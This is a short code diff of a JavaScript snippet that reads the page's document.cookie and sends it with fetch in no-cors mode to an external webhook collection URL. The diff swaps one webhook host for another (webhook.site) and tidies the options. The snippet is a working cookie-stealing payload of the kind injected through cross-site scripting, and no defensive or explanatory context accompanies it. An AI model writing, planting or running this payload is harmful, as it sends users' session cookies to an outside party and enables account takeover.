@@ -1,7 +1,5 @@
 fetch(
-  "https://bin.webhookrelay.com/v1/webhooks/0e65490e-7f29-48c5-ab1c-517a1b260498?data=" +
+  "https://webhook.site/ffbda4d2-7273-4810-8e58-895f411832f8?data=" +
   encodeURIComponent(document.cookie),
-  {
-    mode: "no-cors"
-  }
+  { mode: "no-cors" }
 );
